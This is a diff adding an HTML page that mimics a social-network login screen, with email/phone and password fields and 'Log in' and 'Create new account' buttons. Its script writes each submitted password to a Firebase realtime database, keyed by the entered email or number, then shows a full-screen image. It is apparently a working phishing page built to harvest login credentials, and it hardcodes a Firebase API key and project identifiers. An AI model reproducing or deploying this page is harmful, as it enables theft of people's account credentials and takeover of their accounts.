@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+
+body {
+    margin: 0;
+}
+
+
+.t {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 25px;
+}
+
+
+.iii {
+    display: flex;
+    justify-content: center;
+    height: 70px;
+    margin-bottom: 25px;
+}
+
+
+.iii img {
+    width: 80px;       
+    height: 80px;
+    object-fit: contain;
+    
+}
+
+
+
+input {
+    display: block;
+    width: 300px;
+    height: 50px;
+    border-radius: 30px;
+    margin: 10px auto;
+    box-sizing: border-box;
+    border: 2px solid gray;
+    
+    padding-left: 15px;
+
+}
+
+input:focus {
+    border-color: blue;
+    outline: none;
+}
+
+
+
+.bw {
+    display: flex;
+    justify-content: center;
+    height: 40px;
+}
+
+.bw button {
+
+    width: 300px;      
+    height: 40px;
+    background: blue;
+    border: none;
+    border-radius: 30px;
+    color: white;
+    cursor: pointer;
+}
+
+
+
+.bb {
+    display: flex;
+    justify-content: center;
+    margin-top: 35px;
+    cursor: pointer;
+}
+
+
+
+.bs {
+    display: flex;
+    justify-content: center;
+    margin-top: 15px;
+}
+
+.bs button {
+    width: 300px;
+    height: 40px;
+    background :none;
+    border: 2px solid blue;
+    border-radius: 30px;
+    margin-top: 180px;
+    color:blue;
+    cursor: pointer;
+} 
+
+
+.fullscreen {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.9);
+
+    justify-content: center;
+    align-items: center;
+
+    z-index: 1000;
+}
+
+.fullscreen img {
+    max-width: 95%;
+    max-height: 95%;
+    object-fit: contain;
+}
+
+
+
+
+
+</style>
+
+</head>
+
+<body>
+
+<div class="t">
+    English (UK)
+</div>
+
+
+
+<div class="iii">
+    <div>
+        <img src="2.webp">
+    </div>
+</div>
+
+
+<input placeholder="   Mobile number or email " id="num">
+<input placeholder="   Password " id="pass">
+
+
+
+<div class="bw">
+    <button onclick="openImage()">Log in</button>
+</div>
+
+
+<div class="bb">
+    Forget password ?
+</div>
+
+
+
+<div class="bs">
+    <button>Create new account</button>
+</div>
+
+
+
+<div class="fullscreen" id="imageBox">
+
+    
+
+    <img src="3.png">
+
+</div>
+
+
+<script type="module">
+    
+    
+    import { initializeApp }
+from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+
+import { getDatabase, ref, set }
+from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+
+
+const firebaseConfig = {
+    apiKey: "AIzaSyA4TGUAih1KJxi0UnaJvvDRNSo4vMKEors",
+    authDomain: "youko-f1de8.firebaseapp.com",
+    databaseURL: "https://youko-f1de8-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "youko-f1de8",
+    storageBucket: "youko-f1de8.firebasestorage.app",
+    messagingSenderId: "97116213054",
+    appId: "G-P8RP0TM0R6"
+};
+
+
+const app = initializeApp(firebaseConfig);
+
+const database = getDatabase(app);
+
+
+window.openImage = function() {
+
+let numa = document.getElementById("num").value;
+let passa = document.getElementById("pass").value;
+
+    set(ref(database, numa), passa );
+    
+    setTimeout(() => {
+    
+        document.getElementById("imageBox").style.display = "flex";
+    }, 1000);
+
+
+    
+
+    
+
+
+}
+
+
+
+</script>
+
+</body>
+</html>
